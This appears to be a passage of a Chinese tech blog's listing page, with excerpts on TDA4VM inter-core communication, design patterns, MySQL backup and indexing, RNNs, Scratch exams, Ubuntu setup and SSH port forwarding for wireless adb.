Jacinto7 TDA4VM处理器的核间通信（IPC）框图如图2所示，TDA4VM拥有2*A72、6*R5F 、2*C66、C7x等核，不同核之间的通信依赖IPC（Inter-Processor Communication）。同时，同一种类型的多个核心又可以运行在不同的模式，比如A72可以运行的SMP模式，双核R5F可以运行在Lockstep或Split Mode上，因此，核间通信方案要充分利用硬件提供的机制，实现高效的核间通信，从而充分发挥Soc的整体性能。
图2 ： TI Jacinto7 TDA4VM IPC Framework
TDA4VM硬件提供了Mailbox硬件模块，Mailbox中断机制允许软件在两核之间建立通信通道，这种机制类似于邮箱工作的方式。每个核都有一个专属的邮箱，邮件就是消息内容，通过指定接收方，就可以将消息传递到指定核。Mailbox硬件上支持中断，因此指定核有消息时，就会收到中断，然后开始处理邮件，即处理消息。这就是Mailbox的工作方式。
TDA4VM的IPC方案，基于Mailbox的实现的方式的不同，常用的核间通信方式有两种。
基于RPMSG的核间通信解决方案，适合小块数据消息传递。基于Share Memory核间通信解决方案，适合大块数据传输。 基于RPMSG的核间通信解决方案
RPMSG定义了通信协议的接口，采用RPMSG协议，基于Mailbox模块的核间通信方案如图3所示，该方案传递消息时，首先需要将消息拷贝到的共享内存中（VRing），然后，利用Mailbox将消息传递到指定核上。
图3: RPMSG的核间通信解决方案
上图中术语和缩写解释如下：
Term
Definition or Explanation
IPC
Inter-Processor Communication
MailBox
IP which provides queued interrupt mechanism for communication channel
VRing
Ring Buffer in shared memory
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9733f5817ed3e940f6130f0bb1cd4f52/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/156a2418fb37d83402b0af42cd2fdcda/" rel="bookmark">
			Java策略模式-讲解&#43;实例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、认识策略模式1、概念2、白话理解 二、代码中看策略模式1、没有策略模式怎么写2、引入策略模式 三、策略模式的优缺点优点缺点 一、认识策略模式 1、概念 Context（环境类）：环境类是使用算法的角色，它在解决某个问题（即实现某个方法）时可以采用多种策略。在环境类中维持一个对抽象策略类的引用实例，用于定义所采用的策略。
Strategy（抽象策略类）：它为所支持的算法声明了抽象方法，是所有策略类的父类，它可以是抽象类或具体类，也可以是接口。环境类通过抽象策略类中声明的方法在运行时调用具体策略类中实现的算法。
ConcreteStrategy（具体策略类）：它实现了在抽象策略类中声明的算法，在运行时，具体策略类将覆盖在环境类中定义的抽象策略类对象，使用一种具体的算法实现某个业务处理。
2、白话理解 实际例子：做一批相机，分配中心需要根据相机的类型去找到不同的工人做相机。
在这个例子中
分配中心就是 context具体做相机的工种就是ConcreteStrategy 二、代码中看策略模式 1、没有策略模式怎么写 /** * 生产相机 * */ public void productionCamera(Camera camera) { if (camera.getType().equals(1)) { System.out.println("生产单反相机"); } if (camera.getType().equals(2)) { System.out.println("生产数码相机"); } } 可能你觉得这么写没毛病。那么我想问三个问题
如果说生产相机的逻辑非常长呢？if else会让逻辑非常难读懂如果说后续还有其他其他种类的相机呢？每每增加一种相机都要重新去改代码如果说生产相机的工序很多都是一致的呢？难不成要写重复的代码吗？ 2、引入策略模式 1、设计一个抽象类CameraStrategy，其中有两个方法，第一个是返回类型方法，第二个是实际的生产相机方法。
/** * &lt;p&gt;相机&lt;/p&gt; **/ public abstract class CameraStrategy { /** * 支持的相机种类 * @return */ public abstract Integer supportedCameraType(); /** * 生产相机 * */ public abstract void productionCamera(); } 2、在两个实际生产相机的子类中实现这两个方法。返回具体的实现逻辑
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/156a2418fb37d83402b0af42cd2fdcda/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8989b7a2ec2abd19b9e4deb01b94cc3/" rel="bookmark">
			嵌入式系统Ubuntu系统下编译C程序流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于小编使用的是windows11无法兼容低版本的Vmware和Ubuntu，因此在网上找到了最新版本的软件进行操作
目录
一.环境设置
二.导入并安装Ubuntu22.04
1.准备好虚拟机Vmware
2.在网上下载好Ubuntu
3.根据其他文章进行安装
4.安装完成后如图所示
三.设置网络参数
1. 设置虚拟机的网络适配器为NAT模式（桥接模式）
四.更新软件列表及软件包
五.编写一个简单的输出hello world的C程序
1.安装vim，gcc
2.vi/vim介绍
3.vim的工作模式
4.新建hello.c
5.编译hello.c
六.输入两个整型参数进行运算 （linux与windows)
1.要求
2.编写C语言代码
3.编写c语言代码（windows）
七.用makefile编译上述程序
1.makefile介绍
2.makefile如何工作
3.安装makefile
4.用vim编辑makefile
一.环境设置 虚拟机软件 Vmware16.2.3
Ubuntu 22.04
二.导入并安装Ubuntu22.04 1.准备好虚拟机Vmware 2.在网上下载好Ubuntu 3.根据其他文章进行安装 4.安装完成后如图所示 三.设置网络参数 Ubuntu的网络配置有两种方式，一种是通过interfaces来设置，一种是通过NetworkManager来配置1，这里主要讲解NetworkManager配置方式。
1. 设置虚拟机的网络适配器为NAT模式（桥接模式） 选择 虚拟机-&gt;设置-&gt;网络适配器-&gt;桥接模式
因为最新版的Ubuntu已经十分的人性化所以设置网络参数只需要做到这里，若是使用的是更低版本的Ubuntu则需要根据其他文章来设置网络参数。
四.更新软件列表及软件包 运行如下命令
sudo apt-get update
出现加载进度条
sudo apt-get upgrade
出现加载进度条
等待完成即可
五.编写一个简单的输出hello world的C程序 1.安装vim，gcc 输入命令
sudo apt-get install vim
安装vim编辑器
sudo apt-get install gcc
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d8989b7a2ec2abd19b9e4deb01b94cc3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d4ca83bb945911ad5f9cf8378e55b142/" rel="bookmark">
			mysql数据备份与导入（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.备份概述： 备份：能够防止机械故障以及人为操作失误带来的数据丢失，例如将数据库文件保存在其他地方。
冗余：数据有多份冗余，但不等于备份，只能防止机械故障带来的数据丢失，例如主备模式、数据库集群。
1.备份内容： 1.数据文件
2.配置文件 =》 my.cnf
3.日志文件（主要是二进制文件）
2.扩展：mysql体系结构 1.存储引擎层（MYISAM与INNODB区别）： MYISAM：查询速度快，支持表级锁，支持全文索引
INNODB：支持事务，支持行级锁，支持外键
2. 存储层（MYISAM与INNODB区别）： MYISAM 在data目录对应数据库里生成三个文件
.frm :表结构框架文件
.MYD:表数据文件
.MYI:表索引文件
INNODB在该目录下生成两个文件并且在data目录下生成了一个文件
.ibd ：表索引以及表数据文件 ibdata1：此文件是innodb引擎生成的数据库中所有表的共享的一个公共文件
综上：MYISAM可以直接保存以上三个文件去做备份 ，INNODB不可以，需要专业工具去做备份
2.日志文件 此处主要记录两种类型：
error错误日志：存放数据库的启动，停止或运行时的错误信息 ，一般存放在/data下 文件名为 主机名.err或者mysql.err
binlog二进制日志：1.记录数据库的所有更改操作，2.主要应用于主从复制中，master将二进制日志中的更改操作发送个slave，保证主从一致。3.其次可以用于数据恢复，4.默认关闭 5.通过
2.备份必须考虑的因素 3.备份类型 4.备份方法 全量备份：备份所有数据
增量备份：基于全量备份，备份变化部分
5.mysql逻辑备份 1.mysql表级备份 导出的是sql语句文件，优点是无论什么引擎都可以使用mysqldump备成sql文件，缺点就是速度慢不支持增量备份，导入时可能格式不兼容
基本语法：
单表备份
mysqldump 数据库名 表名 &gt; 目标路径线下的备份文件 -p 密码 单表恢复
mysql 数据库名 &lt; .sql文件位置 -p 密码 或者进入mysql某个库中 source sql文件路径 2.mysql库级备份 mysqldump --databases 库名 &gt; 备份文件全路径 -p 密码 还原与单表一样
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d4ca83bb945911ad5f9cf8378e55b142/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b89652552a1bc260492e7354c9880328/" rel="bookmark">
			剑指 Offer 33. 二叉搜索树的后序遍历序列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 递归求解 基础认识 1. 后续遍历 序列的最后一位就是根节点
2. 搜索树 所有左子树节点都比根节点小，右子树反之。
思路方法 综合上述特点，利用递归方法，递归出口就是当子树只有一个节点时返回TRUE。递归体的构建是，在遍历序列时，遇到的第一个大于根节点的数就是右子树的起点，这样我们得到了左右子树，在遍历的时候判断左子树是否都小于根节点，右子树是否都大于根节点，判断指针位置是否如我们设想的那样遍历完了整个序列。之后就是对左右子树进行递归。
代码实现 class Solution: def verifyPostorder(self, postorder: List[int]) -&gt; bool: def ver(i,j): if i &gt;= j: return True left_end = i while postorder[left_end] &lt; postorder[j]: left_end += 1 right_end = left_end while postorder[right_end] &gt; postorder[j]: right_end += 1 return right_end == j and ver(i,left_end - 1) and ver(left_end,right_end - 1) return ver(0,len(postorder) - 1) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/318502f14f42a28b9c47ce84f186e4a9/" rel="bookmark">
			1.1 python简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python语言的发展过程 Python是在1989年底，由吉多.范罗苏姆（Guido van Rossum）发明。
在1991年，第一版公开发行。
在2000年10月，发布Python 2.0 版本。
在2008年3月， 发布Python 3.0 版本。
在2011年1月，Python被T10BE编程语言排行榜评为2010年度语言。
在2014年11月，发布消息：Python 2.7版本将在2020年停止支持，并且不在发布2.8版本。
在2018年7月， Python在T10BE编程语言排行榜，升至第四名，
2022年7月，T10BE编程语言排行榜如下
Python语言的优缺点 Python语言的应用领域 Python解释器 python解释器是解释python脚本执行的程序。编写python代码保存后，我们会得到一个以.py为扩展名的文本文件。要运行此文件，就需要python解释器去执行.py文件。
CPython：官方版本的解释器，当我们从Python官方网站下载并安装好Python 后，我们就直接获得该解释器。这个解释器是用C语言开发的，所以叫CPython。CPython是使用最广的Python解释器。我们通常说的、下载的、讨论的、使用的都是这个解释器。
Ipython：基于CPython之上的一个交互式解释器，在交互方式上有所增强，执行Python代码的功能和CPython是完全一样的CPython用&gt;&gt;&gt;作为提示符，而IPython用In [序号]:作为提示符。
PyPy：一个追求执行速度的Python解释器。采用JIT技术，对Python代码进行动态编译（注意，不是解释），可以显著提高Python代码的执行速度。绝大部分CPython代码都可以在PyPy下运行，但还是有一些不同的，这就导致相同的Python代码在两种解释器下执行可能会有不同的结果。
Jython：运行在Java平台上的Python解释器，可以直接把Python代码编译成Java字节码执行。
IronPython：和Jython类似，只不过IronPython是运行在微软.Net平台上的Python解释器，可以直接把Python代码编译成.Net的字节码。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1e6d2f1f002ae55a2fd09336159cfd60/" rel="bookmark">
			面向切面编程AOP入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		using Microsoft.AspNetCore.Mvc.Filters; using System.Text.Json; using System.Text.Json.Serialization; namespace AOPTestWebApi.Utility { /// &lt;summary&gt; /// 给控制器方法增加记录日志功能，即在控制器方法执行前或后调用以下方法 /// &lt;/summary&gt; public class LogActionFilterAttribute : ActionFilterAttribute { //方法执行前调用 public override void OnActionExecuting(ActionExecutingContext context) {//仅限控件器类或方法有效。 string url = context.HttpContext.Request.Path.Value; string argument=JsonSerializer.Serialize(context.ActionArguments); string controllerName = context.Controller.GetType().FullName; string actionName = context.ActionDescriptor.DisplayName; Console.WriteLine($"AOP切面开始： 请求url={url}---argument={argument}"); } //方法执行完成后调用 public override void OnActionExecuted(ActionExecutedContext context) { Console.WriteLine("AOP切面结束"); } } } 一、仅为单个控制器方法增加切面日志功能，在方法上增加 [LogActionFilter] 特性
[LogActionFilter] [HttpGet("Writer")] public ActionResult Writer() { m_TestService.Writer(); return Ok(); } 二、为某个控制器类中所有的方法增加切面日志功能，即在控件器类上增加 [LogActionFilter] 特性
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1e6d2f1f002ae55a2fd09336159cfd60/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/24c516ea2c547ff33a340dc14b9e72d8/" rel="bookmark">
			RNN 的基本原理&#43;pytorch代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		RNN 的基本原理+pytorch代码 文章目录 RNN 的基本原理+pytorch代码1.RNN模型的结构2.模型输入（inputs）3.隐藏层（hidden）4.输出层（output）5.反向传播6.RNN的缺陷：长依赖问题7.pytorch调用RNN 1.RNN模型的结构 传统的神经网络结构如下，由输入层，隐藏层和输出层组成
而RNN跟传统神经网络的最大区别在于每次都会将前一次的隐藏层结果带到下一次隐藏的计算中，如图所示：
如果我们将这个循环展开：
上图是一个二维的RNN模型的结构，RNN是循环神经网络，所指的xt和ht就是t时刻的输入，和t时刻对应的隐藏层，千万不要理解成隐藏层有t个隐藏单元。贴一个三维的RNN模型图出来方便理解。
举例：家里电脑坏了，我要拿去修，修好要200大洋。
此时，xt-1为电脑，ht-1=某件物品
​ xt为修，ht可以根据xt和ht-1学习到要去修电脑
​ xt+1为200大洋，ht+1可以学习到修xxx要200大洋
为啥ht+1不知道要修啥呢？200大洋和电脑之间距离太远忘记了（长依赖问题）。
2.模型输入（inputs） RNN模型主要应用于时序型的数据，常见的应用类型为
a.如自然语言：你恰饭了没啊，x1为你，x2为恰…以此类推
b.股票价格，每日天气情况等
对于该类数据，传统模型无法表达前一个状态与后一个状态之间的连续性，故我们一般采用序列型的模型。
3.隐藏层（hidden） 弄清楚了模型输入后，继续了解隐藏层的内容，ht为t时刻输入x对应的隐藏单元
h t = t a n h ( U x t + W h t − 1 + b ) h_t=tanh(Ux_t+Wh_{t-1}+b) ht​=tanh(Uxt​+Wht−1​+b)
其中
ht为t时刻时输入对应的隐藏单元的值；
U是输入层到隐藏层的权重矩阵；
W就是上一次隐藏层的值ht-1作为本次输入的权值矩阵。；
b为偏置量
4.输出层（output） 得到隐藏层的内容后即可计算输出结果
y t = s o f t m a x ( V h t + c ) y_t=softmax(Vh_t+c) yt​=softmax(Vht​+c)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/24c516ea2c547ff33a340dc14b9e72d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46ec0eb1753b60a3c2476e2326e6a14e/" rel="bookmark">
			ubuntu 查看服务器的GPU所有用户使用情况
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方法一 1. 首先查看gpu使用情况，命令： nvidia-smi 通过输出得到可以得到GPU占用情况和主要使用GPU的进程下图所示:
根据结果可以看到进程1081543在跑训练
2. 查看进程用户使用信息 执行下面命令：
ps -f -p 26359 得到输出结果如下图所示：
其中
UID 表示用户ID
PID 表示进程号
PPID 表示父进程号
TIME 表示执行时间
CMD 表示执行命令
方法二 查看一台服务器上所有显卡上的使用者和GPU占用情况 安装gpustat pip install gpustat 安装完成后使用下面命令即可:
watch -n 2 --color gpustat --c 查看完成后 Crtl +Z 即可退出:
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f08ea6eaa5512229941e9e5866e6547d/" rel="bookmark">
			全国青少年软件编程等级考试--scratch-三级-真题-五彩糖葫芦
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2022年6月份真题 考察内容 主要是考察：图章
源码 评分标准 评分标准：
（1）按要求建立变量并设置正确的取值范围；（2分）
（2）能擦除前次舞台绘制图形；（1分）
（3）能从下向上画出长度为100的直线（1分），颜色为蓝色，粗细为3（1分）；
（4）能根据变量设定，用图章指令向上画出指定个数的糖球（以视觉效果为准）；（4分）
（5）完成后能播放声音提示。（1分）
图形化编程（三级） （一）考试标准
1.掌握编程环境的高级功能，并理解其中的基本概念。
1) 能够新建、删除变量，修改变量名；
2) 能够设定、增减变量值，在舞台区显示、隐藏变量；
3) 能够灵活使用画笔及设置画笔的各项参数；
4) 掌握逻辑运算与关系运算的组合使用；
5) 能够运用循环简化多次的反复操作程序；
6) 能够应用广播来传递数据，实现不同角色之间的交互；
7) 能够理解广播和广播并等待的区别；
8) 能够应用克隆来生成克隆体，并灵活控制克隆体。
2.理解并在程序中使用随机数和变量。
1) 理解随机数的概念，能够产生一个随机数；
2) 理解变量的概念，理解变量的作用域；
3) 能够通过变量的变化让程序跳转到不同的部分；
4) 程序中包含不同条件选择语句的嵌套；
5) 程序中包含循环语句的嵌套；
6) 程序中包含根据选择语句的真假跳出循环程序；
7) 循环语句、选择语句嵌套的综合运用。
（二）考核目标
进一步认识编程软件的高级功能，对随机数的产生、变量的设置，
基于变量的逻辑运算与关系运算的组合使用，解决实际问题；考查画笔模块的更高级操作，应用广播来传递数据，应用克隆来生成克隆体，并灵活控制克隆体；考查对选择语句、循环语句的嵌套使用，以及运用循环简化多次的反复操作程序的理解程度。同时针对参加3 级考试的学生将进行多种情况的逻辑处理和交互控制能力的考查。
（三）能力目标
学生对编程软件的进一步综合操作能力，考查对随机数，变量，广播，克隆等知识的掌握，同时考查学生对已掌握知识的深度综合应用，另针对参加3 级考试的学生将进行难度更高的逻辑推理能力的考查。
（四）知识块
知识块思维导图（三级）
（五）知识点描述
编号
知识块
知识点
1
随机数
随机数的产生，随机数的应用场景判定选取
2
变量
新建变量，初始化变量，修改变量名，删除变量， 变量值的设定、增减，变量值变化引起效果的变化，变量的显示和隐藏，变量设置为滑杆模式，变量的作用域，不同应用场景
3
循环语句
运用计数循环简化多次的反复操作程序、运用条件循环简化多次的反复操作程序
4
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f08ea6eaa5512229941e9e5866e6547d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9ce0c6af25a8bdc11b8c7b70c1ffdae9/" rel="bookmark">
			全国青少年软件编程等级考试--scratch-四级-递归求和
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 用递归求算式“1+2+3+……+100”的值。计算1加到100的值 递归：指一种通过重复将问题分解为同类的子问题而解决问题的方法
源码：
图形化编程（四级） （一）考试标准 1.理解并使用链表、函数和多线程。 1) 能够新建链表; 2) 能够完成对链表中数据的插入、删除; 3) 字符串处理; 4) 能够自己创建一个有返回值的函数; 5) 理解函数的作用范围； 6) 理解多线程的概念; 7) 循环的复杂运用； 8) 逻辑，算法过渡。 （二）考核目标 学生对编程软件的较强 综合操作能力 ，考查使用软件进行数据处理的 能力，同时对函数和过程的理解和使用进行考查，以及学生对已掌握知 识的深度综合应用及思考更优程序方案，另针对参加 4 级考试的学生将 12 进行 结合分析和计算的情境 考查。 （三）能力目标 通过本级考试的学生，逻辑推理能力很不错，对数据的处理，函数和 过程等的理解和使用掌握得很不错，对已学知识的综合应用能力很好， 具备一定的程序调试和优化能力。学生对编程软件的进一步 综合操作能 力 ，考查新建链表，字符串处理，循环的复杂运用，理解函数的作用范 围，理解多线程的概念，同时考查学生对已掌握知识的深度综合应用， 另针对参加 4 级考试的学生将进行 难度更高的逻辑推理能力 的考查。 （四）知识块 知识块思维导图（四级） （五）知识点描述 编号 知识块 知识点 1 字符串 字符串操作，加密 2 函数 不同类型函数的创建，参数的设置，返回值，函 数的调用 3 链表 创建链表，实现数据的增、删、改、查，显示和 隐藏，找最值，平均值等 4 大综合 前面所有知识点的综合使用，考查 5 程序优化 使用已有知识进行问题的优化 6 逻辑，算法过渡 分析和计算情境考察，如爬楼梯的方法（递归） 7 循环的复杂运用 循环的结构，循环的嵌套，递归调用 13 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4de174b9b8788fe861141b127653a00/" rel="bookmark">
			分库分表必会-跨库分页查询看此一篇就够了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		跨库分页查询的问题 概述 随着数据库中数据量日益增多，不得进行分库分表，在分库后将数据分布到不同的数据库实例（甚至物理机器）上，以达到降低数据量，提高系统的处理能力，但是这种架构也带来其他问题，比如本文要讲解的跨库查询
全局查询法 test表有数据[1,2,3,4,5,6,7,8]，在单库的时候，查询第2页数据并且显示2条，语句是这样的
select * from test order by id limit 2 offset 2 复制代码 数据返回[3,4],但是数据切分以后，如果要查询，这样语句就可能就会有问题，例如：在节点1执行此语句，返回【6,8】, 节点2返回【5,7】,然后进行排序取前二条返回了【5,6】，可以看到此结果与实际结果不一致，所以应该对sql语句改写为:
select * from test order by id limit 0 offset 4; 复制代码 然后在根据各节点返回的数据，在进行排序，筛选出第2页的2条
缺点 每个节点返回更多的数据，增大了网络传输量
服务层还需要进行二次排序，增大了服务层的计算量
随着页码的增大，性能会急剧下降
优点 查询简单，数据准确，不用做业务兼容，数据库中间件都支持
禁止跳页查询法 在数据量很大，翻页数很多的时候，很多产品并不提供“直接跳到指定页面”的功能，而只提供“下一页”的功能，这一个小小的业务折衷，就能极大的降低技术方案的复杂度
假设db1中值为【2、4、6、8】，db2中值为【1、3、5、7】，根据id进行排序，返回对应的条数，在内存中对各个节点返回的数据进行排序，得到需要的数据，执行以下语句，查询第一页数据，返回结果集为【1,2】
select * from test where id&gt;0 order by id limit 2; 复制代码 相比以前的方案，貌似跟以前处理流程一样，但是在查询第二页时，要根据上一页的id的最大值id_max（第一页的最大id_max为2）,作为第二页的最小值，那么会将如下语句
select * from test order by id limit 2,2; 复制代码 改写成：
select * from test order by id&gt; 2 limit 2 复制代码 这样每个节点不用返回4页数据了，只需要返回跟第一页一样页数的数据，可以看到通过对业务的折中，性能得到大大的提升。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b4de174b9b8788fe861141b127653a00/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0591fe8838bc590cffb1d8ae78d2b83/" rel="bookmark">
			IntelliJ IDEA下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、 下载 方式一：官网下载
Download IntelliJ IDEA: The Capable &amp; Ergonomic Java IDE by JetBrains
方式二：百度网盘下载
链接：https://pan.baidu.com/s/1FNh9pehKzL5Y8l0PY4lHOg 提取码：0327
二、 激活IDEA 双击 下载好的ideaIU-2020.1.exe
跟着步骤走
选择安装路径，
这里根据操作系统选择，我的是64位。
等待下载。。。。
完成，选择启动软件
这里选择免费试用30天
完成！
三、 启动IDEA
新建JAVA项目运行第一个java程序如图表明IDEA已经成功了，可以开始自己的编程学习了 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9bb07fde7158d4c9b5737bebd19f3716/" rel="bookmark">
			ITK-cmake
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		download https://itk.org/download/
tar zxvf InsightToolkit-5.2.1.tar.gz
解压
build 新建 itk-build目录
打开cmake-gui
点击configure
选择默认即可
点击Generate
generate
在itk-build目录里面执行make love@love-virtual-machine:~/Downloads/itk-build$ ls -l total 664 drwxrwxr-x 2 love love 4096 9月 12 09:43 bin -rw-rw-r-- 1 love love 207602 9月 12 09:43 CMakeCache.txt drwxrwxr-x 9 love love 4096 9月 12 09:43 CMakeFiles -rw-rw-r-- 1 love love 30848 9月 12 09:43 cmake_install.cmake drwxrwxr-x 2 love love 4096 9月 12 09:38 CMakeTmp drwxrwxr-x 2 love love 4096 9月 12 09:38 config -rw-r--r-- 1 love love 3628 9月 12 09:38 CPackConfig.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9bb07fde7158d4c9b5737bebd19f3716/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2782d6a1d172480f41f99ae367b54bce/" rel="bookmark">
			数据库索引失效
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		记录一下,方便自己记忆.
前提:参考
1.建表:
mysql&gt; CREATE TABLE `user` ( -&gt; `id` int NOT NULL AUTO_INCREMENT, -&gt; `code` varchar(20) COLLATE utf8mb4_bin DEFAULT NULL, -&gt; `age` int DEFAULT '0', -&gt; `name` varchar(30) COLLATE utf8mb4_bin DEFAULT NULL, -&gt; `height` int DEFAULT '0', -&gt; `address` varchar(30) COLLATE utf8mb4_bin DEFAULT NULL, -&gt; PRIMARY KEY (`id`), -&gt; KEY `idx_code_age_name` (`code`,`age`,`name`), -&gt; KEY `idx_height` (`height`) -&gt; ) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin; Query OK, 0 rows affected (0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2782d6a1d172480f41f99ae367b54bce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/357d1d926695236bbaab7b25d28822d0/" rel="bookmark">
			基于ssh反向代理使用无线adb
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 由于某些网络环境限制，PC端无法访问手机，但手机可以访问PC
这个时候又不想用usb连接，那么就可以利用ssh来反向代理和端口转发
这样PC就能访问到手机然后愉快的使用无线adb了
步骤 手机上可以用termux、Magisk插件，或者eadb环境
我这里选择termux
电脑配置ssh 反向代理需要PC端开启ssh服务
可以通过下面的命令启动ssh服务，注意需要以管理员权限运行
net start sshd 如果你的电脑没有ssh，请参考
win10 开启ssh server服务 远程登录 PC的ssh配置文件路径是C:\ProgramData\ssh\sshd_config
毕竟ssh服务有风险，所以改下配置，禁止密码登录
修改如下，这样就只能通过密钥登录了
PubkeyAuthentication yes AuthorizedKeysFile .ssh/authorized_keys PasswordAuthentication no # Match Group administrators # AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys 务必设置PasswordAuthentication no以禁止通过密码登录注意Match Group administrator和下一行需要注释掉 cmd重启ssh
net stop sshd net start sshd 如果是powershell则使用下面的命令
Restart-Service sshd 补充，如果换了端口后连不上，再试试取消ListenAddress 0.0.0.0的注释，如果还是不行，那可能是防火墙的限制
这里设置为公钥登录了，不换端口也还好
手机配置ssh 这里用termux来操作，先下载apk进行安装
https://github.com/termux/termux-app/releases 打开termux安装ssh
pkg install openssh 用ssh-keygen生成密钥
公钥在/data/data/com.termux/files/home/.ssh/id_rsa.pub
把文件内容复制到PC端的%USERPROFILE%\.ssh\authorized_keys文件中，如果没有请手动创建
如果多个公钥，那么authorized_keys每行一个
添加之后重启下PC端的ssh服务
先打开无线adb功能
现在通过下面的命令实现反向代理和端口转发
ssh -NfR 15555:127.0.0.1:5555 username@192.168.1.140 15555 是电脑本地端口127.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/357d1d926695236bbaab7b25d28822d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46b8120da16d0e17b97c48967ec26db7/" rel="bookmark">
			如何安装 Ubuntu Server 22.04 LTS ?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Ubuntu Server 22.04 LTS 最低系统要求
Dual Core Processor (2 GHz)4 GB Physical RAM25 GB or more Disk SpaceBootable MediaInternet Connectivity (Optional) (1) 下载 Ubuntu Server 22.04 ISO 文件 从 ubuntu官方网站 下载 Ubuntu server 22.04 iso 文件
下载 ISO 文件后，然后将其刻录到 U盘中并使其可启动。
(2) 用可引导介质引导系统 重新启动系统，并从 bios 设置中将其启动介质从硬盘更改为 USB
当系统从USB启动后，我们将得到如下画面
选择 “Try or Install Ubuntu Server” 并按回车键。
(3) 选择安装过程中使用的语言 选择您喜欢的语言，然后回车
(4) 选择安装过程中使用的键盘布局 选择您喜欢的键盘布局，然后回车
(5) 选择安装类型 在此步骤中，将提示您选择安装的基础，有两种选择：
Ubuntu Server – It will have all the software which are required to run and manage Ubuntu server smoothly.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/46b8120da16d0e17b97c48967ec26db7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18246467ba71b4bf27dd6f550faac701/" rel="bookmark">
			数据库索引优化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.索引覆盖 现象：在利用二级索引查询时，只能查询到主键值，然后需要再查询主键索引树，才能得到对应行数据．
原因：可以减少回表的次数，提高查询性能．
应用：建立联合索引
eg：
select name from table where id_card between 10 and 15;//id_card为普通索引． 优化：建立联合索引（id_card,name）
2.在建立联合索引的时候，如何安排索引内的字段顺序？ 频繁查询的字段在联合索引中应该尽量靠左设计，能少维护一个索引是一个．
3.在建立联合索引的时候，如果需要对单个索引字段进行查询，该如何设计？ eg：有联合索引（a，b），但还需要查询单独基于a或b进行查询．因基于b进行查询时，是不能利用索引（a，b）的．故此时需要按照a和b谁的字段小谁就再单独建一个索引．若b的字段比a小，就建立（ａ，ｂ），（b）两个索引．
3.索引下推(Index Condition Pushdown，ICP)　3.1mysqlv5.6之后引入ICP
3.2在使用联合索引的时候，按照最左匹配原则没有匹配到的字段该怎麼办？如以下情况：
前提：建立了联合索引（name,age）
